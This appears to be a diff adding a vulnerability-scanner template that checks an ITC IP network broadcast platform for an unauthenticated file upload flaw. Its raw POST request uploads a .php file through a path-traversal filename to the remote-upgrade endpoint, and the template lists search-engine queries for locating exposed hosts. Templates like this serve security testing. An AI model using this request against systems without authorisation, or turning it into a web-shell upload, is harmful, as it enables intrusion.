@@ -1,0 +1,42 @@
+id: itc-remote-upgrade-fileupload
+
+info:
+  name: IP 广播服务平台未授权文件上传漏洞
+  author: zan8in
+  severity: critical
+  description: |-
+    hunter: web.icon=="9091011a03bffd9898d79fc589a2c65d"
+    fofa: icon_hash="-568806419"
+  reference:
+    - https://mp.weixin.qq.com/s/IlYncItSFMGiX_3ozegHVA
+  tags: ITC-IP网络广播服务平台
+
+variables:
+  filename: "{{rand_text_alpha(6)}}"
+  randstr: "{{rand_text_alphanumeric(30)}}"
+  rboundary: "{{rand_text_alpha(8)}}"
+
+http:
+  - raw:
+      - |
+        POST /api/v2/remote-upgrade/upload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="file"; filename="../{{filename}}.php"
+        Content-Type: application/octet-stream
+
+        {{randstr}}
+        ------WebKitFormBoundary{{rboundary}}--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"relative_path":'
+          - '"name":"{{filename}}.php"'
+        part: body
